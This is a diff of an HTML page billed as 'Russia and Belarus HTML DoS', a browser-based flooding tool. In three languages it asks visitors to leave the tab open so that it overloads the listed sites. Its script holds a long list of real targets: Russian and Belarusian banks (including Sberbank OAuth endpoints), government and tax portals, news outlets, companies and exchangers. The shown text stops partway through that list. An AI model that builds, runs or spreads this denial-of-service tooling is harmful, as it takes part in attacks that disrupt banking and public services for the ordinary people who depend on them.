@@ -2,407 +2,427 @@
 <html>
 
 <head>
-    <meta charset="utf-8">
+    <meta charset="UTF-8">
     <title>Russia and Belarus HTML DoS</title>
-    <link rel="stylesheet" href="style.css">
 </head>
+
 <body>
-    <p>Reformated from https://stop-russian-desinformation.near.page</p>
-    <h1 class="title">Russia and Belarus HTML DoS</h1>
-    <ul>
-        <li>
-            <h3>English version</h3>
-            <p class="sub">For security concerns, you are able to simply save the webpage, and run locally - as well as
-                view the
-                source. It
-                is
-                entirely HTML and browser interpreted.</p>
-            <p class="sub">The "official" news in russian federation and belarus are all fake and we believe it is better to shut
-                them down! The government sites and banks are also taking a hit!</p>
-            <p class="sub">Please, just open this page and let it be open on your devices, it will flood the web-sites
-                and pose a
-                huge load
-                on
-                their infrastructure</p>
-        </li>
-        <li>
-            <h3 class="sub">Русская версия</h3>
-            <p class="sub">"Официальные" новости в рф - это театр абсурда и мы считаем, что это нужно остановить!</p>
-            <p class="sub">Пожалуйста, просто откройте эту страницу на своём компьютере и оставтье вкладку открытой, она
-                будет
-                автоматически
-                нагружать сайты российской пропаганды.</p>
-        </li>
-        <li>
-            <h3 class="sub">Українська версія</h3>
-            <p class="sub">Офіційні новини в рф - це театр абсурду і ми вважаємо, що це треба зупинити!</p>
-            <p class="sub">Будь ласка, просто залиште відкритою цю сторінку на своєму комп'ютері щоб вона автоматично
-                навантажувала
-                сайти
-                російської пропаганди.</p>
-        </li>
 
-    </ul>
-    
-    <h3 class="desc">Here is the stats of your session (the links and the number of the requests that were sent from
-        your
-        browser):<br>
-        Failed to fetch is normal - if any site has that - that means their servers are under load and are dropping
-        packets - which is the goal!</h3>
-    <div id="stats" class="stats">
+    <h1>Russia and Belarus HTML DoS</h1>
+
+    <p>Reformatted from: <a href="https://stop-russian-desinformation.near.page">https://stop-russian-desinformation.near.page</a></p>
+
+    <table>
+        <thead>
+            <tr>
+                <th>English version</th>
+                <th>Русская версия</th>
+                <th>Українська версія</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>
+                    <p>For security concerns, you are able to simply save the webpage, and run locally - as well as view
+                        the source. It is entirely HTML and browser interpreted.</p>
+                    <p>The "official" news in the Russian Federation and Belarus is all fake and we believe it is
+                        better to shut them down! The government sites and banks are also taking a hit!</p>
+                    <p>Please, just open this page and let it be open on your devices, it will flood the websites and
+                        pose a huge load on their infrastructure.</p>
+                    <p>Your browser will be slow. It's ok, don't worry and keep it run.</p>
+                    <p>A small contribution from each of us will save Ukraine 🙏</p>
+                </td>
+                <td>
+                    <p>«Официальные» новости в РФ полны пропаганды и транслируют лживую информацию о событиях на Украине. Мы
+                        считаем, что лучше их закрыть и позволить людям переключиться на достоверные новости.</p>
+                    <p>Пожалуйста, просто откройте эту страницу на своём компьютере и оставтье вкладку открытой, она будет
+                        автоматически нагружать сайты российской пропаганды.</p>
+                    <p>Ваш браузер будет работать медленно. Все в порядке, не волнуйтесь и держите его открытым.</p>
+                    <p>Небольшой вклад каждого из нас спасет Украину 🙏</p>
+                </td>
+                <td>
+                    <p>«Офіційні» новини в РФ сповнені пропаганди та транслюють брехливу інформацію про події в Україні. Ми
+                        вважаємо, що краще їх закрити та дозволити людям переключитися на достовірні новини.</p>
+                    <p>Будь ласка, відкрийте цю сторінку на вашому пристрої. Це закидає російські пропагандистські сайти запитами
+                        та створить величезне навантаження на їхню інфраструктуру.</p>
+                    <p>Ваш браузер працюватиме повільно. Все гаразд, не хвилюйтеся та тримайте його відкритим.</p>
+                    <p>Невеликий внесок кожного з нас врятує Україну 🙏</p>
+                </td>
+            </tr>
+        </tbody>
+    </table>
+
+    <p class="desc">Below are the stats of your session (URLs and requests that were sent from your browser)<br>
+        Sites with the "Failed to fetch" error message are dropping packets due to heavy load, which is the goal!<br>
+        A high number of errored responses may be due to a DDoS protection service.</p>
+
+    <div>
+        <table>
+            <thead>
+                <tr>
+                    <th>URL</th>
+                    <th>Number of Requests</th>
+                    <th>Number of Errors</th>
+                    <th>Error Message</th>
+                </tr>
+            </thead>
+            <tbody id="stats"></tbody>
+        </table>
     </div>
-    <div id="errors"></div>
-<style>
-    body {
-    padding: 0;
-    margin: 0;
-    background: white;
-    font-family: Arial, sans-serif;
-    background: linear-gradient(to bottom, #005BBB 50%, #FFD500 50%);
-    background-repeat: no-repeat;
-    background-attachment: fixed;
-}
 
-.title{
-    margin: 0 auto 3rem auto;
-    text-align: center;
-}
-
-ul{
-    width: 100%;
-    padding-left: 0;
-    text-align: center;
-}
-
-li{
-    display: inline-block;
-    list-style-type: none;
-    width: 20%;
-    text-align: center;
-}
-li:nth-child(even){
-    padding-left: 5%;
-    padding-right: 5%;
-}
-
-.desc{
-    padding-top: 2rem;
-    padding-bottom: 2rem;
-    color:black;
-    margin: 0 auto;
-    text-align: center;
-    width: 60%;
-}
-    </style>
-    <script>
-        var targets = {
-            'https://absolutbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.avangard.ru/rus/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.avtogradbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.autokreditbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.agroros.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://ai-bank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://bank.yandex.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.ak-bars.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.aksonbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.aktivbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.akcia-bank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.alexbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.alefbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://albank.ru/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://altbb.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://capitalbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://alfabank.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.atb.su/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.andjibank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.mfk-bank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.aresbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://bank-arzamas.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.aspectbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://assotsiatsiyabank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://baikalrosbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://byrich.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.vtb.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://norvikbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.zemsky.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.unicreditbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.open.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.raiffeisen.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://abr.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.gazprombank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://ria.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://gazeta.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://kp.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://riafan.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://pikabu.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://kommersant.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://mk.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://yaplakal.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://rbc.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://bezformata.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://gazprom.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://lukoil.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://magnit.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://nornickel.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://surgutneftegas.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://tatneft.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://evraz.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://nlmk.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://sibur.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://severstal.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://metalloinvest.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://nangs.org': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://rmk-group.ru/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://tmk-group.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://ya.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://polymetalinternational.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://uralkali.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://eurosib.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://omk.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://sberbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://vtb.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://gazprombank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://gosuslugi.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://mos.ru/uslugi': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://kremlin.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://government.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://mil.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://nalog.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://customs.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://pfr.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://rkn.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://lenta.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://ria.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://ria.ru/lenta/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.rbc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.rt.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'http://en.kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://smotrim.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://tass.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://tvzvezda.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://vsoloviev.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.1tv.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.vesti.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://online.sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://iz.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://ukraina.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.gazprom.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://lukoil.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://magnit.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.nornickel.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.surgutneftegas.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.tatneft.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.evraz.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://nlmk.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.sibur.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.severstal.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.metalloinvest.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.tmk-group.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.polymetalinternational.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.uralkali.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.eurosib.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.sberbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.vtb.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.gazprombank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.gosuslugi.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.mos.ru/uslugi/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'http://kremlin.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'http://government.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.nalog.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'http://newletters.kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'http://20.kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://constitution.kremlin.ru': { number_of_requests: 0, number_of_errored_responses: 0 },            
-            'http://belres.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'http://belta.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'http://www.ctv.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'http://www.mil.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://belarus24.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://alfaradio.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'http://www.kgb.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.sb.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://sputnik.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://rec.gov.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://radiomir.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://radiostalica.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://radiobrestfm.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.tvrmogilev.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://minsknews.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://zarya.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://grodnonews.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.tvr.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://yandex.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://belarusbank.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.nbrb.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://brrb.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.belapb.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://bankdabrabyt.by/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-            'https://mail.rkn.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-            'https://cloud.rkn.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-            'https://mvd.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-            'https://pwd.wto.economy.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-            'https://stroi.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-            'https://proverki.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://ont.by': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-            'https://nbrb.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://bgb.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://belres.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://energo.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'http://www.bellegprom.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.belneftekhim.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://shop-rt.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://sb.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://belarusbank.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://belarus.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://belmarket.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://rec.gov.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://mil.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://vtb.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://sberbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.gazprombank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://ya.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://president.gov.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://cleanbtc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://bonkypay.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://changer.club/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://superchange.net': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://mine.exchange/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://platov.co': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://ww-pay.net/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://delets.cash/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://betatransfer.org': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://ramon.money/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://coinpaymaster.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://bitokk.biz/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.netex24.net': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://cashbank.pro/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://flashobmen.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://abcobmen.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://ychanger.net/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://multichange.net/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://24paybank.ne': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://royal.cash/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://prostocash.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://baksman.org/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://kupibit.me/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://abcobmen.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://fsb.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://mcs.mail.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://roe.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://1tv.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://tass.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://relcom.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://gosuslugi41.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://uslugi27.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://gosuslugi29.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://gosuslugi.astrobl.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.gosuslugi.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://prokuratura.gov.by': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-            'https://rusvesna.su/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-            'https://oac.gov.by/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-            'https://bisr.gov.by/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-            'https://www.mpt.gov.by/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-            'https://www.mfa.gov.by': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-            'https://www.mvd.gov.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.mininform.gov.by': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://mintrans.gov.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://iecp.ru/ep/ep-verification': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://iecp.ru/ep/uc-list': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://uc-osnovanie.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.nucrf.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.belinfonalog.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.roseltorg.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.astralnalog.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.nwudc.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.center-inform.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https:/kk.bank/UdTs': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://structure.mil.ru/structure/uc/info.htm': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.ucpir.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://dreamkas.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.e-portal.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://izhtender.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://imctax.parus-s.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.icentr.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.kartoteka.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://rsbis.ru/elektronnaya-podpis': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.stv-it.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.crypset.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.kt-69.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.24ecp.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://kraskript.com': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://ca.ntssoft.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.y-center.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.rcarus.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://rk72.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://squaretrade.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://ca.gisca.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.otchet-online.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://udcs.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.cit-ufa.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://elkursk.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.icvibor.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://ucestp.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://mcspro.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://www.infotrust.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://epnow.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://ca.kamgov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://mascom-it.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://cfmc.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-       }
-
-        var statsEl = document.getElementById('stats');
-        function printStats() {
-            statsEl.innerHTML = '<pre>' + JSON.stringify(targets, null, 2) + '</pre>'
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: fixed linear-gradient(0deg, #0057b7 50%, #ffd700 50%) no-repeat;
         }
-        setInterval(printStats, 100);
+
+        h1 {
+            margin: 2rem;
+            text-align: center;
+        }
+
+        body>p {
+            margin: 1rem;
+        }
+
+        table {
+            width: 100%;
+        }
+
+        body>table>thead>tr>th {
+            width: 33%;
+            font-size: x-large;
+        }
+
+        body>table>tbody>tr>td {
+            padding: 1rem;
+        }
+
+        .desc {
+            margin: 2rem;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        div {
+            margin: 1rem;
+        }
+    </style>
+
+    <script>
+        var targetList = [
+            'http://20.kremlin.ru/',
+            'http://belres.by/',
+            'http://belta.by/',
+            'http://en.kremlin.ru/',
+            'http://government.ru/',
+            'http://kremlin.ru/',
+            'http://newletters.kremlin.ru/',
+            'http://www.bellegprom.by/',
+            'http://www.ctv.by/',
+            'http://www.kgb.by/',
+            'http://www.mil.by/',
+            'https://1tv.ru',
+            'https://20.kremlin.ru/',
+            'https://24paybank.ne',
+            'https://abcobmen.com/',
+            'https://abr.ru/',
+            'https://absolutbank.ru/',
+            'https://ai-bank.ru/',
+            'https://albank.ru/ru/',
+            'https://alfabank.com/',
+            'https://alfaradio.by/',
+            'https://altbb.ru/',
+            'https://api.sberbank.ru/prod/tokens/v2/oauth',
+            'https://api.sberbank.ru/prod/tokens/v2/oidc',
+            'https://assotsiatsiyabank.ru/',
+            'https://baikalrosbank.ru/',
+            'https://baksman.org/',
+            'https://bank-arzamas.ru/',
+            'https://bank.yandex.ru/',
+            'https://bankdabrabyt.by/',
+            'https://belarus.by/',
+            'https://belarus24.by/',
+            'https://belarusbank.by/',
+            'https://belmarket.by/',
+            'https://belres.by/',
+            'https://betatransfer.org',
+            'https://bezformata.com/',
+            'https://bgb.by/',
+            'https://bisr.gov.by/',
+            'https://bitokk.biz/',
+            'https://bonkypay.com/',
+            'https://brrb.by/',
+            'https://byrich.ru/',
+            'https://ca.gisca.ru',
+            'https://ca.kamgov.ru',
+            'https://ca.ntssoft.ru',
+            'https://capitalbank.ru/',
+            'https://cashbank.pro/',
+            'https://cfmc.ru',
+            'https://changer.club/',
+            'https://cleanbtc.ru/',
+            'https://cloud.rkn.gov.ru/',
+            'https://coinpaymaster.com/',
+            'https://constitution.kremlin.ru/',
+            'https://customs.gov.ru/',
+            'https://delets.cash/',
+            'https://dreamkas.ru',
+            'https://elkursk.ru',
+            'https://energo.by/',
+            'https://epnow.ru',
+            'https://er.ru/',
+            'https://eurosib.ru/',
+            'https://evraz.com/ru/',
+            'https://flashobmen.com/',
+            'https://fsb.ru',
+            'https://gazeta.ru/',
+            'https://gazprom.ru/',
+            'https://gazprombank.ru/',
+            'https://gosuslugi.astrobl.ru',
+            'https://gosuslugi.ru/',
+            'https://gosuslugi29.ru',
+            'https://gosuslugi41.ru',
+            'https://government.ru/',
+            'https://grodnonews.by/',
+            'https://iecp.ru/ep/ep-verification',
+            'https://iecp.ru/ep/uc-list',
+            'https://imctax.parus-s.ru',
+            'https://iz.ru/',
+            'https://izhtender.ru',
+            'https://kommersant.ru/',
+            'https://kp.ru/',
+            'https://kraskript.com',
+            'https://kremlin.ru/',
+            'https://kupibit.me/',
+            'https://lenta.ru/',
+            'https://lukoil.ru/',
+            'https://magnit.ru/',
+            'https://mail.rkn.gov.ru/',
+            'https://mascom-it.ru',
+            'https://mcs.mail.ru',
+            'https://mcspro.ru',
+            'https://metalloinvest.com/',
+            'https://mil.by',
+            'https://mil.ru/',
+            'https://mine.exchange/',
+            'https://minsknews.by/',
+            'https://mintrans.gov.by/',
+            'https://mk.ru/',
+            'https://mos.ru/uslugi',
+            'https://multichange.net/',
+            'https://mvd.gov.ru/',
+            'https://nalog.gov.ru/',
+            'https://nangs.org/',
+            'https://nbrb.by/',
+            'https://nlmk.com/',
+            'https://nornickel.com/',
+            'https://norvikbank.ru/',
+            'https://oac.gov.by/',
+            'https://omk.ru/',
+            'https://online.sberbank.ru/',
+            'https://ont.by/',
+            'https://pfr.gov.ru/',
+            'https://pikabu.ru/',
+            'https://platov.co',
+            'https://polymetalinternational.com/ru/',
+            'https://president.gov.by',
+            'https://president.gov.by/en',
+            'https://prokuratura.gov.by',
+            'https://prostocash.com/',
+            'https://proverki.gov.ru/',
+            'https://pwd.wto.economy.gov.ru/',
+            'https://radiobrestfm.by/',
+            'https://radiomir.by/',
+            'https://radiostalica.by/',
+            'https://ramon.money/',
